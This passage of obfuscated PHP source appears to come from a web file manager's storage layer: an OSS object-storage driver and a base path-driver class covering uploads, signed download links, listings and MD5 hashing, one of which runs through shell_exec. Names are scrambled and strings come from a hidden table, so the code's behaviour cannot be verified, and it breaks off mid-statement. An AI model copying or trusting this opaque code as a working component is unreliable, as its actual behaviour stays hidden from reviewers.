$½öı®¡ = $¥¯ƒ„ú->getListPart(); $ œˆã… = array(); foreach ($½öı®¡ as $İ¼Òîº¦) { $ œˆã…[] = array($õ­É¿èí[1433] => $İ¼Òîº¦->getPartNumber(), $õ­É¿èí[1434] => trim($İ¼Òîº¦->getETag(), $õ­É¿èí[118])); } unset($íÏ§å–[$õ­É¿èí[240]], $íÏ§å–[$õ­É¿èí[244]]); $©×ë’ï‘ = $this->multiUploadAuthData($ß“ÊÖà¹, $íÏ§å–); if (empty($©×ë’ï‘)) { return !1; } return array($õ­É¿èí[249] => $©×ë’ï‘, $õ­É¿èí[239] => $íÏ§å–[$õ­É¿èí[239]], $õ­É¿èí[251] => $ œˆã…); } public function download($·û­ÂÑ¯, $İ—¨Á÷ß) { if ($this->isFolder($·û­ÂÑ¯)) { return !1; } try { $°Áù—£€ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $İ—¨Á÷ß); $°Áù—£€ = $this->trafficLimit($_SERVER[—ÌÒğš÷][109], $°Áù—£€); $this->client->getObject($this->bucket, $this->pathEncode($·û­ÂÑ¯), $°Áù—£€); } catch (OSS\Core\OssException $øò×˜³®) { return !1; } return $İ—¨Á÷ß; } public function fileSubstr($¶ß©²ñª, $¾ùËü„– = 0, $ıõÇ¶‘ = false) { if ($¾ùËü„– === -1) { $ó’³Ì±® = array(); } else { if ($ıõÇ¶‘ === !1) { $³–ó²äç = $this->size($¶ß©²ñª); } else { $³–ó²äç = $¾ùËü„– + $ıõÇ¶‘ - 1; } $ó’³Ì±® = array(OSS\OssClient::OSS_RANGE => "{$¾ùËü„–}\x2d{$³–ó²äç}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¶ß©²ñª), $ó’³Ì±®); } catch (OSS\Core\OssException $Å½º»‡‰) { think_exception($Å½º»‡‰->getMessage()); return !1; } } private function trafficLimit($•úğ‰ÁÍ, $™‰Åé—œ = array()) { $­ü¹…“˜ =& $_SERVER[—ÌÒğš÷]; if ($•úğ‰ÁÍ == $­ü¹…“˜[1439] && $this->isUploadServer() || $•úğ‰ÁÍ == $­ü¹…“˜[109] && $this->isFileOutServer()) { return $™‰Åé—œ; } $Š“²ñÑ = floatval($GLOBALS[$­ü¹…“˜[6]][$­ü¹…“˜[89]][$­ü¹…“˜[107]][$•úğ‰ÁÍ]) * 1024 * 1024 * 8; if (!$Š“²ñÑ) { return $™‰Åé—œ; } $Š“²ñÑ = $Š“²ñÑ < 819200 ? 819200 : ($Š“²ñÑ > 838860800 ? 838860800 : $Š“²ñÑ); $™‰Åé—œ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Š“²ñÑ); return $™‰Åé—œ; } public function link($®á¸Ö‚‘, $Ù˜ï»İÍ = array()) { $Ö¨œ¼İ =& $_SERVER[—ÌÒğš÷]; if (!$this->exist($®á¸Ö‚‘) || $this->isFolder($®á¸Ö‚‘)) { return !1; } try { $Ù˜ï»İÍ = $this->trafficLimit($Ö¨œ¼İ[109], $Ù˜ï»İÍ); $î¢š©˜± = $this->client->signUrl($this->bucket, $this->pathEncode($®á¸Ö‚‘), 3600 * 12, $Ö¨œ¼İ[245], $Ù˜ï»İÍ); return $this->getCdnLink($î¢š©˜±); } catch (OSS\Core\OssException $§Æ±Ğ†¶) { return !1; } } public function fileOut($’Ò°ì´«, $µì÷ºŸ€ = false, $§‹ã‰Â„ = false, $ãæÙÂÃ“ = '') { $³ÁĞ‹¼í =& $_SERVER[—ÌÒğš÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($’Ò°ì´«, $µì÷ºŸ€, $§‹ã‰Â„, $ãæÙÂÃ“); } if (!$§‹ã‰Â„) { $§‹ã‰Â„ = $this->pathThis($’Ò°ì´«); } $§‹ã‰Â„ = rawurlencode($§‹ã‰Â„); $Œê®»´˜ = get_file_mime(get_path_ext($§‹ã‰Â„)); if ($Œê®»´˜ == $³ÁĞ‹¼í[232]) { return parent::fileOut($’Ò°ì´«, $µì÷ºŸ€, $§‹ã‰Â„, $ãæÙÂÃ“); } $µì÷ºŸ€ = $µì÷ºŸ€ ? $³ÁĞ‹¼í[1449] : $³ÁĞ‹¼í[1450]; $¿ØíÄ•÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $³ÁĞ‹¼í[1451] . rawurlencode("{$µì÷ºŸ€}\x3b\146\151\154\x65\x6e\x61\x6d\145\x3d{$§‹ã‰Â„}")); $¿ØíÄ•÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $³ÁĞ‹¼í[1452] . rawurlencode($Œê®»´˜); $æò¬äº = $this->link($’Ò°ì´«, $¿ØíÄ•÷); $this->fileOutLink($æò¬äº); } public function fileOutServer($¨œ™è¡£, $·©ş…¦ = false, $œŠ¯’œö = false, $èÎ“Ôç’ = '') { parent::fileOut($¨œ™è¡£, $·©ş…¦, $œŠ¯’œö, $èÎ“Ôç’); } public function fileOutImage($”—ø‰áÀ, $¯¤¡ÒÇö = 250) { if ($this->size($”—ø‰áÀ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($”—ø‰áÀ, $¯¤¡ÒÇö); } $¹¢àÆ…ß = array(OSS\OssClient::OSS_PROCESS => $_SERVER[—ÌÒğš÷][1453] . $¯¤¡ÒÇö); $ôâãó = $this->link($”—ø‰áÀ, $¹¢àÆ…ß); $this->fileOutLink($ôâãó); } public function fileOutImageServer($ªÜí²÷, $×Í‹¨ƒ = 250) { parent::fileOutImage($ªÜí²÷, $×Í‹¨ƒ); } public function fileOutLink($Úà¥„™Ì) { $šâ†®¢ë =& $_SERVER[—ÌÒğš÷]; if (!$this->isCdnHost() && substr($Úà¥„™Ì, 0, 7) == $šâ†®¢ë[1374]) { $Úà¥„™Ì = $šâ†®¢ë[1375] . substr($Úà¥„™Ì, 7); } header($šâ†®¢ë[162] . $Úà¥„™Ì); die; } public function hashMd5($•±¦ì, $¥½¨à¸¯ = '') { $ÑÀ·÷êõ =& $_SERVER[—ÌÒğš÷]; $şê€ÖÖî = $this->_objectMeta($•±¦ì); if (!$şê€ÖÖî) { return $ÑÀ·÷êõ[12]; } if (!isset($şê€ÖÖî[$ÑÀ·÷êõ[1429]]) && !empty($¥½¨à¸¯)) { $ÙÓßâ… = $this->updateObjMeta($•±¦ì, array($ÑÀ·÷êõ[1429] => $¥½¨à¸¯)); $şê€ÖÖî[$ÑÀ·÷êõ[1429]] = $ÙÓßâ… ? $¥½¨à¸¯ : $ÑÀ·÷êõ[12]; } return isset($şê€ÖÖî[$ÑÀ·÷êõ[1429]]) ? strtolower($şê€ÖÖî[$ÑÀ·÷êõ[1429]]) : $ÑÀ·÷êõ[12]; } public function size($ÉÃÁÑ™Ÿ) { $Ó‘ò›Ôô = $this->objectMeta($ÉÃÁÑ™Ÿ); return $Ó‘ò›Ôô ? $Ó‘ò›Ôô[$_SERVER[—ÌÒğš÷][76]] : 0; } public function info($¯ã¤Ôú ) { if ($this->isFolder($¯ã¤Ôú )) { return $this->folderInfo($¯ã¤Ôú ); } else { if ($this->isFile($¯ã¤Ôú )) { return $this->fileInfo($¯ã¤Ôú ); } } return !1; } public function exist($‘ï‹üÛº) { return $this->isFile($‘ï‹üÛº) || $this->isFolder($‘ï‹üÛº); } public function isFile($¿ŒñËˆİ) { return !$this->isFolder($¿ŒñËˆİ) && $this->objectMeta($¿ŒñËˆİ); } public function isFolder($î‹şåää) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][166], $î‹şåää); } protected function objectMeta($êÉ¶³Ìâ) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][168], $êÉ¶³Ìâ); } protected function _objectMeta($¤½¢Ñ³) { $Ø€¡‘´ =& $_SERVER[—ÌÒğš÷]; try { $êƒ˜¤ä = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¤½¢Ñ³)); } catch (OSS\Core\OssException $ğŠ×ˆÈï) { $êƒ˜¤ä = !1; } if ($êƒ˜¤ä) { $êƒ˜¤ä[$Ø€¡‘´[76]] = intval($êƒ˜¤ä[$Ø€¡‘´[1427]]); } return $êƒ˜¤ä; } protected function _isFolder($¹áŠí³Ñ) { $Ğ˜Úã½ =& $_SERVER[—ÌÒğš÷]; if ($¹áŠí³Ñ == $Ğ˜Úã½[12] || $¹áŠí³Ñ == $Ğ˜Úã½[8]) { return !0; } $‹Œ¯Äõ = array($Ğ˜Úã½[1422] => $Ğ˜Úã½[8], $Ğ˜Úã½[1423] => rtrim($¹áŠí³Ñ, $Ğ˜Úã½[8]) . $Ğ˜Úã½[8], $Ğ˜Úã½[1424] => 1, $Ğ˜Úã½[1425] => $Ğ˜Úã½[12]); $îÜñ¸©¶ = $this->client->listObjects($this->bucket, $‹Œ¯Äõ); if ($îÜñ¸©¶->getObjectList() || $îÜñ¸©¶->getPrefixList()) { return !0; } return !1; } } goto fùãõœ“¸Ù; EôÓùËÔ ±: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¼£ÂéÔÇ =& $_SERVER[—ÌÒğš÷]; $this->objectDriver = array($¼£ÂéÔÇ[60], $¼£ÂéÔÇ[61], $¼£ÂéÔÇ[62], $¼£ÂéÔÇ[63], $¼£ÂéÔÇ[64], $¼£ÂéÔÇ[65], $¼£ÂéÔÇ[66], $¼£ÂéÔÇ[67], $¼£ÂéÔÇ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($“šæ£‡Š) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($“šæ£‡Š, $_SERVER[—ÌÒğš÷][8]); } return $“šæ£‡Š; } public function iconvApp($Şİ¥îñ) { return $Şİ¥îñ; } public function iconvSystem($¬Ñ¼ıù) { return $¬Ñ¼ıù; } public function iconvTo($ºúéÇĞ, $ÓÁ‹Ã÷û, $æ°ƒ¨ƒ) { $²ã•÷²ã =& $_SERVER[—ÌÒğš÷]; if (!$ºúéÇĞ || !function_exists($²ã•÷²ã[69])) { return $ºúéÇĞ; } static $–€ãÂÉ© = array(); $¶Ğ¤ùíè = $ÓÁ‹Ã÷û . $²ã•÷²ã[70] . $æ°ƒ¨ƒ . $²ã•÷²ã[71] . $ºúéÇĞ; if (isset($–€ãÂÉ©[$¶Ğ¤ùíè])) { return $–€ãÂÉ©[$¶Ğ¤ùíè]; } if (function_exists($²ã•÷²ã[72])) { $Ï®Ü©±† = @mb_convert_encoding($ºúéÇĞ, $æ°ƒ¨ƒ, $ÓÁ‹Ã÷û); } else { $Ï®Ü©±† = @iconv($ÓÁ‹Ã÷û, $æ°ƒ¨ƒ, $ºúéÇĞ); } $Ï®Ü©±† = $Ï®Ü©±† ? $Ï®Ü©±† : $ºúéÇĞ; if (strstr($Ï®Ü©±†, $²ã•÷²ã[73])) { $Ï®Ü©±† = str_replace($²ã•÷²ã[73], $²ã•÷²ã[11], $Ï®Ü©±†); } $–€ãÂÉ©[$ÓÁ‹Ã÷û . $²ã•÷²ã[70] . $æ°ƒ¨ƒ . $²ã•÷²ã[71] . $ºúéÇĞ] = $Ï®Ü©±†; $–€ãÂÉ©[$æ°ƒ¨ƒ . $²ã•÷²ã[70] . $ÓÁ‹Ã÷û . $²ã•÷²ã[71] . $ºúéÇĞ] = $ºúéÇĞ; $–€ãÂÉ©[$æ°ƒ¨ƒ . $²ã•÷²ã[70] . $ÓÁ‹Ã÷û . $²ã•÷²ã[71] . $Ï®Ü©±†] = $ºúéÇĞ; $–€ãÂÉ©[$ÓÁ‹Ã÷û . $²ã•÷²ã[70] . $æ°ƒ¨ƒ . $²ã•÷²ã[71] . $Ï®Ü©±†] = $Ï®Ü©±†; return $Ï®Ü©±†; } public function getPathInner($…âì¯ÄÎ) { $Ñ¨ôÁÀî = IO::init($…âì¯ÄÎ); return $Ñ¨ôÁÀî->path; } public function getPathOuter($¦°‚å€) { $—’ì =& $_SERVER[—ÌÒğš÷]; $Ñ§×’Ÿ­ = strlen(trim($this->pathBase, $—’ì[8])); $¦°‚å€ = substr(trim($¦°‚å€, $—’ì[8]), $Ñ§×’Ÿ­); return $this->pathDriver . $—’ì[8] . ltrim($¦°‚å€, $—’ì[8]); } public function isParentOf($¥·øòË¡, $º×‹ğ¤È) { $èùÊÉâÙ =& $_SERVER[—ÌÒğš÷]; $¥·øòË¡ = rtrim(strtolower($¥·øòË¡), $èùÊÉâÙ[8]) . $èùÊÉâÙ[8]; $º×‹ğ¤È = rtrim(strtolower($º×‹ğ¤È), $èùÊÉâÙ[8]) . $èùÊÉâÙ[8]; $¥Û¶Ÿ©ş = strpos($º×‹ğ¤È, $¥·øòË¡) === 0; return $¥Û¶Ÿ©ş; } public function getType() { $†ú¡¯àú =& $_SERVER[—ÌÒğš÷]; $…³ö•ãĞ = str_replace($†ú¡¯àú[74], $†ú¡¯àú[12], get_class($this)); return strtolower($…³ö•ãĞ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ß‡„Š·ª, $úÚÊµ±Ô) { $ˆçÜÒ­ =& $_SERVER[—ÌÒğš÷]; $Î‡â˜®£ = rtrim($ß‡„Š·ª, $ˆçÜÒ­[8]) . $ˆçÜÒ­[8] . $úÚÊµ±Ô; $ÉÌí‡…£ = $this->exist($Î‡â˜®£); return $ÉÌí‡…£ ? $Î‡â˜®£ : !1; } public function setModifyTime($è…ÛÜÊø, $æÆğ»À = '') { } public function renameObject($ÖÊªæßŸ, $ÉƒŒâìÉ) { $…‚á²©Ø = $ÉƒŒâìÉ; $ÖÊªæßŸ = $this->getPathOuter($ÖÊªæßŸ); $ÉƒŒâìÉ = $this->pathFather($ÖÊªæßŸ) . $ÉƒŒâìÉ; $‡µĞ´ßÏ = IO::copy($ÖÊªæßŸ, $this->pathFather($ÖÊªæßŸ), REPEAT_RENAME_FOLDER, $…‚á²©Ø); if ($‡µĞ´ßÏ) { IO::remove($ÖÊªæßŸ); } return $‡µĞ´ßÏ ? $ÉƒŒâìÉ : !1; } public function tempFile($–İıÌ° = '', $Î¼‹ş— = '') { if (!$–İıÌ°) { $–İıÌ° = rand_string(15); } $‘ıò— = TEMP_FILES . rand_string(15) . $_SERVER[—ÌÒğš÷][8]; @mkdir($‘ıò—, DEFAULT_PERRMISSIONS, !0); $­ùÖÒ¡ = $‘ıò— . $–İıÌ°; @touch($­ùÖÒ¡); if ($Î¼‹ş—) { file_put_contents($­ùÖÒ¡, $Î¼‹ş—); } return $­ùÖÒ¡; } public function tempFileRemve($ÜÁ¶Ä½û) { @unlink($ÜÁ¶Ä½û); @rmdir($this->pathFather($ÜÁ¶Ä½û)); } public function mkfile($œîüê†è, $ ”áÇÇ¥ = '', $»«ıãü² = REPEAT_RENAME) { } public function mkdir($ª‡¢°ÅÎ, $‹ÖÔØ­ = REPEAT_SKIP) { } public function delFile($ñÄØ¿¼) { } public function delFolder($íÕ®Õ¸Ø) { } public function copyFile($¹ª–Í‹Ÿ, $˜³åÒÕ«) { } public function moveFile($øĞ•òÖ», $Úı±âğ) { } public function remove($‡Ìª‹Œ‹) { if ($this->isFile($‡Ìª‹Œ‹)) { return $this->delFile($‡Ìª‹Œ‹); } return $this->delFolder($‡Ìª‹Œ‹); } public function rename($·ò€ÚÖ, $ƒ”Ã¥¢) { } public function exist($øÑåÇ™©) { } public function findByHash($ô¢éˆŞ© = '', $•¬êÃ¸î = '') { return !1; } public function isFile($¸½×î°ª) { } public function isFolder($¢ø…íè¶) { } public function size($¯çççÒ) { } public function info($¡Àê—¹) { } public function infoSimple($üçº¾ñ®) { return $this->info($üçº¾ñ®); } public function infoAuth($êÁõºïÅ) { return $this->info($êÁõºïÅ); } public function infoFull($¸üÁª‡á) { return $this->info($¸üÁª‡á); } public function infoFullSimple($Ñ¹Üıåı) { return $this->info($Ñ¹Üıåı); } public function infoWithChildren($²ÇÚ–§¿) { $¾¹®òë =& $_SERVER[—ÌÒğš÷]; static $èºÌÚÅ = array(); if (isset($èºÌÚÅ[$²ÇÚ–§¿])) { return $èºÌÚÅ[$²ÇÚ–§¿]; } $¡Ê²· ò = $this->info($²ÇÚ–§¿); if ($¡Ê²· ò && $¡Ê²· ò[$¾¹®òë[33]] == $¾¹®òë[75]) { $øœŠµ¦ = array($¾¹®òë[76] => 0, $¾¹®òë[77] => 0, $¾¹®òë[78] => 0); $this->infoChildren($²ÇÚ–§¿, $øœŠµ¦); $¡Ê²· ò[$¾¹®òë[76]] = $øœŠµ¦[$¾¹®òë[76]]; $¡Ê²· ò[$¾¹®òë[79]] = array($¾¹®òë[80] => $øœŠµ¦[$¾¹®òë[77]], $¾¹®òë[81] => $øœŠµ¦[$¾¹®òë[78]]); $èºÌÚÅ[$²ÇÚ–§¿] = $¡Ê²· ò; } return $¡Ê²· ò; } public function listPath($®úŒ–Û, $ÅŸùîá  = false) { } public function has($…Àô´ÎÌ, $×’Õ‡Ğ = false, $Ä÷¯ì»› = false) { } public function canRead($¶°ÎÍıÌ) { } public function canWrite($÷ò”·Ïï) { } public function getContent($üšëö´Ù) { } public function setContent($¼â–Ò³î, $Ú£ƒç˜µ = '') { } protected function infoChildren($ë×¦ë„, &$Ñò¬ÉÂì) { $Ì–·Çõ– =& $_SERVER[—ÌÒğš÷]; check_abort_echo(); $Ü»šú¡ = $this->listPath($ë×¦ë„, !0); $Ü»šú¡ = array_merge($Ü»šú¡[$Ì–·Çõ–[82]], $Ü»šú¡[$Ì–·Çõ–[83]]); foreach ($Ü»šú¡ as $Ù¶Ü™Š€) { if ($Ù¶Ü™Š€[$Ì–·Çõ–[33]] == $Ì–·Çõ–[75]) { $Ñò¬ÉÂì[$Ì–·Çõ–[78]]++; $Òô°›Èí = $this->getPathInner($Ù¶Ü™Š€[$Ì–·Çõ–[84]]); $this->infoChildren($Òô°›Èí, $Ñò¬ÉÂì); } else { $Ñò¬ÉÂì[$Ì–·Çõ–[77]]++; $Ñò¬ÉÂì[$Ì–·Çõ–[76]] += $Ù¶Ü™Š€[$Ì–·Çõ–[76]]; } } } public function fileSubstr($ÊÂ§øæ, $ÌÏ˜À, $¿Âñ¡‰û) { } public function listAll($ı‚ıó¦’) { } public function listAllMake($ üŞúá, &$ı©¹‚) { $Û¸ŞÏ¶Ü =& $_SERVER[—ÌÒğš÷]; check_abort_echo(); $¤ğŸèªÉ = $this->listPath($ üŞúá, !0); if (!$¤ğŸèªÉ) { return; } $×õ…ì’Õ = array_merge($¤ğŸèªÉ[$Û¸ŞÏ¶Ü[82]], $¤ğŸèªÉ[$Û¸ŞÏ¶Ü[83]]); foreach ($×õ…ì’Õ as $¯¼ÛúªÂ) { $Ê°•È§ = $¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[33]] == $Û¸ŞÏ¶Ü[75]; $ßå«·± = array($Û¸ŞÏ¶Ü[84] => $¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[84]], $Û¸ŞÏ¶Ü[75] => $Ê°•È§); if (isset($¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[76]])) { $ßå«·±[$Û¸ŞÏ¶Ü[76]] = $¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[76]]; } if (isset($¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[85]])) { $ßå«·±[$Û¸ŞÏ¶Ü[85]] = $¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[85]]; } if (!$Ê°•È§) { $ı©¹‚[] = $ßå«·±; continue; } $ı©¹‚[] = $ßå«·±; $úœù´¦« = $¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[84]]; $±™ƒĞûë = $this->pathDriver; if (substr($¯¼ÛúªÂ[$Û¸ŞÏ¶Ü[84]], 0, strlen($±™ƒĞûë)) == $±™ƒĞûë) { $úœù´¦« = substr($úœù´¦«, strlen($±™ƒĞûë)); } $this->listAllMake($úœù´¦«, $ı©¹‚); } } public function listAllSimple($öô®ÒšË, $•û¬ÃøÅ = false) { $ÜÂõƒà¹ = $this->listAll($öô®ÒšË); return $this->listAllSimpleMake($ÜÂõƒà¹, $this->getPathOuter($öô®ÒšË), $•û¬ÃøÅ); } public function listAllSimpleMake($Ëçñµ†“, $ûÃîØñĞ, $¶‹©”Ä) { $ÕÑ™·±´ =& $_SERVER[—ÌÒğš÷]; $ìà—ğÁŒ = array(); $ûÃîØñĞ = rtrim(get_path_father($ûÃîØñĞ), $ÕÑ™·±´[8]) . $ÕÑ™·±´[8]; foreach ($Ëçñµ†“ as $™ê¼Âóš) { $±°ÇíÊ· = array($ÕÑ™·±´[84] => $™ê¼Âóš[$ÕÑ™·±´[84]], $ÕÑ™·±´[86] => $™ê¼Âóš[$ÕÑ™·±´[84]], $ÕÑ™·±´[75] => $™ê¼Âóš[$ÕÑ™·±´[75]]); if (isset($™ê¼Âóš[$ÕÑ™·±´[76]]) && !$™ê¼Âóš[$ÕÑ™·±´[75]]) { $±°ÇíÊ·[$ÕÑ™·±´[76]] = $™ê¼Âóš[$ÕÑ™·±´[76]]; } if (isset($™ê¼Âóš[$ÕÑ™·±´[85]])) { $±°ÇíÊ·[$ÕÑ™·±´[85]] = $™ê¼Âóš[$ÕÑ™·±´[85]]; } if (is_array($™ê¼Âóš[$ÕÑ™·±´[87]])) { $±°ÇíÊ·[$ÕÑ™·±´[86]] = $™ê¼Âóš[$ÕÑ™·±´[87]][$ÕÑ™·±´[84]]; $±°ÇíÊ·[$ÕÑ™·±´[76]] = $™ê¼Âóš[$ÕÑ™·±´[87]][$ÕÑ™·±´[76]]; $±°ÇíÊ·[$ÕÑ™·±´[85]] = $™ê¼Âóš[$ÕÑ™·±´[87]][$ÕÑ™·±´[85]]; } else { if (substr($™ê¼Âóš[$ÕÑ™·±´[84]], 0, strlen($ûÃîØñĞ)) == $ûÃîØñĞ) { $±°ÇíÊ·[$ÕÑ™·±´[84]] = substr($™ê¼Âóš[$ÕÑ™·±´[84]], strlen($ûÃîØñĞ)); } } $¯àÖÂÀ… = $™ê¼Âóš[$ÕÑ™·±´[75]] ? $ÕÑ™·±´[8] : $ÕÑ™·±´[12]; $±°ÇíÊ·[$ÕÑ™·±´[86]] = rtrim($±°ÇíÊ·[$ÕÑ™·±´[86]], $ÕÑ™·±´[8]) . $¯àÖÂÀ…; $±°ÇíÊ·[$ÕÑ™·±´[84]] = $ÕÑ™·±´[8] . trim($±°ÇíÊ·[$ÕÑ™·±´[84]], $ÕÑ™·±´[8]) . $¯àÖÂÀ…; if (!$¶‹©”Ä) { $ÓÊÙ¿Šó = explode($ÕÑ™·±´[8], trim($±°ÇíÊ·[$ÕÑ™·±´[84]], $ÕÑ™·±´[8])); $±°ÇíÊ·[$ÕÑ™·±´[84]] = $ÕÑ™·±´[8] . implode($ÕÑ™·±´[8], array_slice($ÓÊÙ¿Šó, 1)) . $¯àÖÂÀ…; } $ìà—ğÁŒ[] = $±°ÇíÊ·; } return array_sort_by($ìà—ğÁŒ, $ÕÑ™·±´[84]); } public function upload($ê»ğ¤Ó , $›ì®ù±®, $ÖİŞÍ†‚ = false, $˜Ìä‘ç¯ = REPEAT_REPLACE) { } public function uploadFileByID($¿¾ò¥½Ô, $ßˆİï®, $ù–ù†°È) { } public function uploadFileByPath($Ø¬¡©¦, $İ–óó•°, $»¸ÇÆùÉ = array()) { } public function isUploadServer() { $„á‰ïÄÄ =& $_SERVER[—ÌÒğš÷]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $„á‰ïÄÄ[88]) { return !0; } return $GLOBALS[$„á‰ïÄÄ[6]][$„á‰ïÄÄ[89]][$„á‰ïÄÄ[90]]; } public function isFileOutServer() { $ÙÀõÑû =& $_SERVER[—ÌÒğš÷]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÙÀõÑû[88]) { return !0; } return $GLOBALS[$ÙÀõÑû[6]][$ÙÀõÑû[89]][$ÙÀõÑû[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($šŒËô’Ğ) { $¸˜´åÀ =& $_SERVER[—ÌÒğš÷]; if (!$this->isCdnHost()) { return $šŒËô’Ğ; } return str_replace(trim(get_url_root($šŒËô’Ğ), $¸˜´åÀ[8]), trim($this->cdnHost, $¸˜´åÀ[8]), $šŒËô’Ğ); } public function uploadLink($üéšåüº, $Ô¢îğÒ¢ = 0) { $—ôÛ¦ô =& $_SERVER[—ÌÒğš÷]; if ($this->isUploadServer()) { return; } $²µÑÛıÇ = $this->getType(); if (!in_array($²µÑÛıÇ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ß¡´Ÿıà = 1024 * 1024 * 10; $ô…ÊãÒ = $Ô¢îğÒ¢ <= $ß¡´Ÿıà ? $—ôÛ¦ô[92] : $—ôÛ¦ô[93]; $ ëş¯¾ = (!$Ô¢îğÒ¢ ? 1 : ceil($Ô¢îğÒ¢ / pow(1024, 3))) * 3600 * 4; $ÌÆÎ·ü = $this->{$ô…ÊãÒ}($üéšåüº, $ ëş¯¾); if ($ÌÆÎ·ü) { $ÌÆÎ·ü[$—ôÛ¦ô[94]] = $üéšåüº; $ÌÆÎ·ü[$—ôÛ¦ô[95]] = $²µÑÛıÇ; } return $ÌÆÎ·ü; } public function uploadFormData($åªÊÄ·ã, $›œ’í‰µ = 3600) { } public function multiUploadFormData($Ê™ğ¥œË, $¨˜òŠ¸É = 3600) { } public function download($¾®½‘Õà, $ªÔî çë) { } public function ext($‰¢‰Û¤•) { $®ÊŒİ„ =& $_SERVER[—ÌÒğš÷]; if (strpos($‰¢‰Û¤•, $®ÊŒİ„[8]) === -1) { $ª¿Ñ£ = $‰¢‰Û¤•; } else { $ª¿Ñ£ = $this->pathThis($‰¢‰Û¤•); } $¯¨ÎÕş½ = $®ÊŒİ„[12]; if (strstr($ª¿Ñ£, $®ÊŒİ„[10])) { $¯¨ÎÕş½ = substr($ª¿Ñ£, strrpos($ª¿Ñ£, $®ÊŒİ„[10]) + 1); $¯¨ÎÕş½ = strtolower($¯¨ÎÕş½); } if (strlen($¯¨ÎÕş½) > 3 && preg_match($®ÊŒİ„[96], $¯¨ÎÕş½, $˜†µÓ…)) { $¯¨ÎÕş½ = $®ÊŒİ„[12]; } return $¯¨ÎÕş½; } public function pathThis($ºŒ¢éé) { $¹³½ë•³ =& $_SERVER[—ÌÒğš÷]; $ºŒ¢éé = str_replace($¹³½ë•³[97], $¹³½ë•³[8], rtrim($ºŒ¢éé, $¹³½ë•³[8])); $¯ŒƒĞñª = strrpos($ºŒ¢éé, $¹³½ë•³[8]); if ($¯ŒƒĞñª === !1) { return $ºŒ¢éé; } return substr($ºŒ¢éé, $¯ŒƒĞñª + 1); } public function pathFather($éùÍ£åï) { $‚Åº¸¸Ä =& $_SERVER[—ÌÒğš÷]; $éùÍ£åï = str_replace($‚Åº¸¸Ä[97], $‚Åº¸¸Ä[8], rtrim($éùÍ£åï, $‚Åº¸¸Ä[8])); $®‰•¹ñ– = strrpos($éùÍ£åï, $‚Åº¸¸Ä[8]); if ($®‰•¹ñ– === !1) { return $‚Åº¸¸Ä[12]; } return substr($éùÍ£åï, 0, $®‰•¹ñ– + 1); } public function hashSimple($¼­©éåƒ) { $Şáª¾õù =& $_SERVER[—ÌÒğš÷]; if (!$¼­©éåƒ) { return md5($Şáª¾õù[12]); } $åà›¢Û = $this->size($¼­©éåƒ); $¯­íŠÁ‰ = 200; $ú¼Æ› ‚ = 50; if ($åà›¢Û <= $¯­íŠÁ‰ * $ú¼Æ› ‚) { return $this->hashMd5($¼­©éåƒ) . $åà›¢Û; } $»ñ†áê = intval($åà›¢Û / $ú¼Æ› ‚); $ÊŞÉÌİê = $Şáª¾õù[12]; for ($Æ’ğîº = 0; $Æ’ğîº < $ú¼Æ› ‚; $Æ’ğîº++) { $ÊŞÉÌİê .= $this->fileSubstr($¼­©éåƒ, $»ñ†áê * $Æ’ğîº, $¯­íŠÁ‰); } $ÊŞÉÌİê .= $this->fileSubstr($¼­©éåƒ, $åà›¢Û - $¯­íŠÁ‰, $¯­íŠÁ‰); return md5($ÊŞÉÌİê) . $åà›¢Û; } public static $md5Cache = array(); public function hashMd5($ÛÁ‰¾›) { if (!$ÛÁ‰¾›) { return md5($_SERVER[—ÌÒğš÷][12]); } $ÛÁ‰¾› = $this->iconvSystem($ÛÁ‰¾›); if (isset(self::$md5Cache[$ÛÁ‰¾›])) { return self::$md5Cache[$ÛÁ‰¾›]; } self::$md5Cache[$ÛÁ‰¾›] = $this->hashMd5Shell($ÛÁ‰¾›); if (!self::$md5Cache[$ÛÁ‰¾›]) { self::$md5Cache[$ÛÁ‰¾›] = @md5_file($ÛÁ‰¾›); } return self::$md5Cache[$ÛÁ‰¾›]; } private function hashMd5Shell($ÙÒ®š‚ô) { $ËÚé©Ö” =& $_SERVER[—ÌÒğš÷]; if (!$ÙÒ®š‚ô) { return md5($ËÚé©Ö”[12]); } if (!function_exists($ËÚé©Ö”[98])) { return !1; } $Ò¯î£¤Á = array($ËÚé©Ö”[99], $ËÚé©Ö”[100]); $ˆİÓÏ®Ô = Cache::get($ËÚé©Ö”[101]); if (!$ˆİÓÏ®Ô) { $êöé¦Û× = BASIC_PATH . $ËÚé©Ö”[102]; $ìÈ€Öß› = md5_file($êöé¦Û×); $ˆİÓÏ®Ô = $ËÚé©Ö”[103]; foreach ($Ò¯î£¤Á as $¯„Êë±¨) { $›ì¦øİì = shell_exec($¯„Êë±¨ . "\40\x22{$êöé¦Û×}\42"); if ($›ì¦øİì && substr(trim($›ì¦øİì), 0, 32) == $ìÈ€Öß›) { $ˆİÓÏ®Ô = $¯„Êë±¨; break; } } Cache::set($ËÚé©Ö”[101], $ˆİÓÏ®Ô, 3600); } if ($ˆİÓÏ®Ô == $ËÚé©Ö”[103]) { return !1; } $›ì¦øİì = shell_exec($ˆİÓÏ®Ô . 